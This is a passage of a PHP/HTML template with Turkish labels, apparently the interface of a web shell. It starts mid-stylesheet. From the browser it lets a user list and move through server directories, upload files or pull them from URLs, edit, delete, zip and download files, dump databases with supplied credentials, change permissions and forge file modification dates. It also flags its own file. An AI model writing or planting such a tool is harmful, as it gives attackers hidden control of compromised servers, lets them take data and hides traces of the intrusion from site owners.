body{font:13px sans-serif;background:#f0f0f0;margin:0;color:#222;height:100vh;display:flex;flex-direction:column}.c{padding:10px;display:flex;flex-direction:column;height:100vh;box-sizing:border-box}.card{background:#fff;border:1px solid #ccc;margin-bottom:5px;border-radius:3px}.h{padding:10px;background:#f5f5f5;cursor:pointer;font-weight:bold;display:flex;justify-content:space-between;align-items:center}.b{padding:10px;display:none;border-top:1px solid #ccc}.sc{flex:1;overflow-y:auto;background:#fff;border:1px solid #ccc}table{width:100%;border-collapse:collapse}th{position:sticky;top:0;background:#f9f9f9;z-index:1}td,th{padding:8px;text-align:left;border-bottom:1px solid #eee}input,textarea,select{width:100%;padding:10px;margin:4px 0;box-sizing:border-box;border:1px solid #ccc}.btn{background:#444;color:#fff;border:0;padding:10px;cursor:pointer;border-radius:3px}.eb{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:100;display:none;flex-direction:column;padding:10px;box-sizing:border-box}.eb textarea{flex:1;font-family:monospace;font-size:14px;background:#1e1e1e;color:#d4d4d4;padding:15px;resize:none}.o .b{display:block}.o .h{background:#eee}.act-btn{text-decoration:none;font-size:16px;margin:0 2px;cursor:pointer}.self{color:red !important;font-weight:bold}.self a{color:red !important}</style></head><body><div class="c"><div class="card" style="padding:10px;display:flex;justify-content:space-between;align-items:center"><div><a href="?d=<?=s($self_dir)?>" style="text-decoration:none;font-size:18px;margin-right:10px">🏠</a><b>Dizin:</b> <?=$d?></div><div><span style="color:blue;margin-right:10px"><?=$m?></span><a href="?logout=1" class="btn" style="text-decoration:none;background:#d9534f">ÇIKIŞ</a></div></div><div style="display:flex;gap:5px;margin:5px 0;"><a href="?d=<?=s($ud)?>" style="flex:1;padding:10px;background:#fff;text-decoration:none;border:1px solid #ccc;font-weight:bold;text-align:center">📂 ÜST DİZİN</a><?php if(isset($_SESSION['cb'])): ?><form method="post" style="flex:1"><input type="submit" name="ps" value="📋 YAPIŞTIR (<?=basename($_SESSION['cb']['p'])?>)" class="btn" style="background:#2980b9"></form><?php endif; ?></div><div class="card"><div class="h" onclick="this.parentNode.classList.toggle('o')">☁️ YÜKLE / URL / OLUŞTUR <span>▼</span></div><div class="b"><form method="post" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Yükle" class="btn"></form><form method="post"><textarea name="urls" placeholder="URL'ler"></textarea><input type="submit" name="url" value="Çek" class="btn"></form><hr><form method="post"><input type="text" name="item_name" placeholder="İsim" required><select name="item_type"><option value="file">Dosya</option><option value="dir">Klasör</option></select><input type="submit" name="new_item" value="Oluştur" class="btn"></form></div></div><div class="card"><div class="h" onclick="this.parentNode.classList.toggle('o')">🗄️ VERİTABANI <span>▼</span></div><div class="b"><form method="post"><input name="h" value="localhost"><input name="us" placeholder="Kullanıcı"><input name="p" placeholder="Şifre" type="text"><input name="db" placeholder="Veritabanı"><input type="submit" name="db_exp" value="SQL İndir" class="btn"></form></div></div><form method="post" id="mf" style="display:flex;flex-direction:column;flex:1;overflow:hidden"><div style="display:flex;gap:5px;margin-bottom:5px"><select name="ti" style="margin:0"><option value="sil">🗑️ Sil</option><option value="zip">📦 Ziple</option></select><input type="submit" value="UYGULA" class="btn" style="flex:1"></div><div class="sc"><table><thead><tr style="background:#f9f9f9"><th></th><th>İsim</th><th>Tarih</th><th>Boyut</th><th>İşlem</th></tr></thead><tbody><?php foreach(array_merge($ks,$ds) as $f){$p=$d.'/'.$f;$is=is_dir($p);$sd=s($p);$tm=date("d.m.Y H:i",filemtime($p));$is_s=($f==$self_file);?><tr class="<?=$is_s?'self':''?>"><td><input type="checkbox" name="sd[]" value="<?=$sd?>"></td><td><a href="<?=($is?"?d=$sd":"#")?>" style="text-decoration:none;color:<?=$is?'#f39c12':($is_s?'red':'#3498db')?>;font-weight:bold"><?=$is?'📁':'📄'?> <?=$f?></a></td><td style="color:#666;font-size:13px"><?=$tm?></td><td style="color:#666;font-size:13px"><?=$is?'--':round(filesize($p)/1024,1).' KB'?></td><td style="white-space:nowrap"><a href="?dl=<?=$sd?>" class="act-btn">📥</a><a href="javascript:void(0)" onclick="rn('<?=$sd?>','<?=$f?>')" class="act-btn">🏷️</a><?php if(!$is){?><a href="javascript:void(0)" onclick="ed('<?=$sd?>','<?=$f?>')" class="act-btn">✏️</a><?php } ?><a href="javascript:void(0)" onclick="mt('<?=$sd?>','<?=substr(sprintf('%o',fileperms($p)),-4)?>','<?=date("Y-m-d H:i",filemtime($p))?>')" class="act-btn">🛠️</a><a href="javascript:void(0)" onclick="cb('<?=$sd?>','cp')" class="act-btn">📄</a><a href="javascript:void(0)" onclick="cb('<?=$sd?>','ct')" class="act-btn">✂️</a></td></tr><?php } ?></tbody></table></div></form></div><div id="eb" class="eb"><div style="display:flex;justify-content:space-between;padding-bottom:10px"><b id="enf"></b><input type="button" value="KAPAT" class="btn" onclick="document.getElementById('eb').style.display='none'" style="background:#d9534f;width:auto"></div><form method="post" style="flex:1;display:flex;flex-direction:column"><input type="hidden" name="fp" id="efp"><textarea name="cont" id="ect" spellcheck="false"></textarea><div style="padding-top:10px"><input type="submit" name="save" value="💾 KAYDET" class="btn" style="background:#5cb85c"></div></form></div><form id="hf" method="post"><input type="hidden" name="p" id="hp"><input type="hidden" name="nn" id="hn"><input type="hidden" name="ren" id="hr"><input type="hidden" name="cp" id="hcp"><input type="hidden" name="ct" id="hct"></form><script>function ed(p,n){document.getElementById('enf').innerText='Düzenle: '+n;fetch('?dl='+p).then(r=>r.text()).then(t=>{document.getElementById('ect').value=t;document.getElementById('efp').value=p;document.getElementById('eb').style.display='flex';});}function rn(p,o){let nn=prompt('Yeni isim:',o);if(nn){document.getElementById('hp').value=p;document.getElementById('hn').value=nn;document.getElementById('hr').value=1;document.getElementById('hf').submit();}}function cb(p,t){document.getElementById('hp').value=p;if(t=='cp')document.getElementById('hcp').value=1;else document.getElementById('hct').value=1;document.getElementById('hf').submit();}function mt(p,pe,da){let nP=prompt("İzin:",pe);let nD=prompt("Tarih:",da);if(nP||nD){let f=document.createElement('form');f.method='post';f.innerHTML=`<input name="edit_meta" value="1"><input name="meta_path" value="${p}"><input name="perm" value="${nP}"><input name="date" value="${nD}">`;document.body.appendChild(f);f.submit();}}</script></body></html>